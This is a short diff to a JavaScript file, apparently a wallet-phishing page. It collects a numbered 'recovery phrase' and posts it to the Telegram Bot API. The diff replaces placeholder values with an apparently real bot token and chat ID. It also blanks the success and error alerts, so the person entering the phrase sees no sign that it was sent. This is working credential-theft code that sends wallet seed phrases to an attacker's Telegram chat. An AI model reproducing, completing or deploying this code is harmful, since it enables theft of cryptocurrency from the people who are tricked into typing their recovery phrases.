@@ -243,8 +243,8 @@
         phrase += i + ". " + value + "\n";
       }
 
-      const botToken = "<YOUR_BOT_TOKEN>"; // <-- Remplace par ton bot token
-      const chatId = "<YOUR_CHAT_ID>";     // <-- Remplace par ton chat ID
+      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // <-- Remplace par ton bot token
+      const chatId = "6996434307";     // <-- Remplace par ton chat ID
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -256,9 +256,9 @@
           text: "🔐 New Recovery Phrase:\n\n" + phrase
         })
       }).then(() => {
-        alert("Recovery phrase sent securely.");
+        alert("");
       }).catch((error) => {
-        alert("Error sending to Telegram.");
+        alert("");
         console.error(error);
       });
     }
